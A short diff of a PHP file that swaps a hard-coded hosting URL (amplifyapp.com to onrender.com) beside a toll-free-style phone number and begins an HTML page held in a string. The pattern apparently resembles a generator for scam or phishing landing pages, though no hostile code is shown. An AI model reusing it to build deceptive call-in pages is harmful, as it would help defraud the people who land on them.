@@ -1,6 +1,6 @@
 <?php
 $number = '0101-866-809-4274';
-$dynamic_url = "https://main.d1r3tn1ldg47ap.amplifyapp.com/";
+$dynamic_url = "https://onrender-3brc.onrender.com";
 $codeString = '
 <html lang="en"><head><meta http-equiv="content-type" content="text/html;charset=utf-8">
     <meta charset="utf-8">
